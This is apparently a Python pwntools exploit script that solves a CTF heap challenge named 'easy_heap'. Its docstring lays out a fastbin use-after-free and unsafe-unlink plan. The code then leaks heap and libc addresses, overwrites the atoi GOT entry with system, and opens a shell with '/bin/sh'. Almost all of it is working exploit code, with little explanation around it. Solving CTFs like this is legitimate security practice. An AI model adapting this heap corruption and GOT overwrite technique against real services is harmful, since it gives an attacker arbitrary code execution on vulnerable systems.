"""
A trivial solution to this exists by using the global 'name' string to do
arbitrary read/write

However, I tried exploiting the challenge without using the global ptr

1. UAF in fastbin leads to fastbin corruption.
2. Modify fd pointer to point somewhere before an allocated chunk's header
3. Allocate overlapping chunks -> change a chunk's size > fastbin range
4. Unsafe unlink (global ptrs present in .bss)
"""

from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./easy_heap"

bin = ELF(file)
libc = ELF("easyheap_libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./easyheap_libc.so.6")}

conn = process(file, env=env)
#gdb.attach(conn)

def menu(choice):
    conn.recvuntil("Your choice: ")
    conn.sendline(str(choice))

def create(index, name):
    menu(1)
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("Input this name: ")
    conn.send(name)
    conn.recvuntil("Done!")

def edit(index, name):
    menu(2)
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("Input new name: ")
    conn.send(name)
    conn.recvuntil("Done!")

def delete(index):
    menu(3)
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("Done!")

def show(index):
    menu(4)
    conn.recvuntil("Index: ")
    conn.sendline(str(index))
    conn.recvuntil("This name")
    conn.recvuntil("is: ")

conn.sendline("vampire")
conn.recvuntil("age")
conn.sendline(str(21))

names_addr = 0x0804B0A0

# Leaking heap address
create(0, "abc")
create(1, "def")
create(2, "ghi")
delete(1)
delete(2)
show(2)

heap_leak = u32(conn.recvn(4))

# Clearing fastbin
create(2, "a")
payload = p32(0) + \
          p32(0xe8) + \
          p32(names_addr + 4 - 3*4) + \
          p32(names_addr + 4 - 2*4)
create(1, payload)

# Creating size for non fast chunk

for i in range(3):
    create(9, "a")

create(8, "a")
create(9, "a")

for i in range(15):
    create(6, (p32(0xe8) + p32(0x51))*4)

# Fastbin corruption
delete(8)
log.info("Heap leak: " + hex(heap_leak))
edit(8, p32(heap_leak + 0x100 - 0x28 - 0x8) + p32(0x29))
create(8, "a")
payload = p32(0)*6 + \
          p32(0xe8) + \
          p32(0xe8)
create(7, payload)

delete(9)

def a_read(addr):
    edit(1, p32(0)*2 + p32(addr))
    show(0)

def a_write(addr, data):
    edit(1, p32(0)*2 + p32(addr))
    edit(0, data)

a_read(bin.got['atoi'])
atoi_addr = u32(conn.recvn(4))
libc.address = atoi_addr - libc.symbols['atoi']

a_write(bin.got['atoi'], p32(libc.symbols['system']))

conn.sendline("/bin/sh")

log.info("Libc leak: " + hex(atoi_addr))
log.info("Heap leak: " + hex(heap_leak))
conn.interactive()
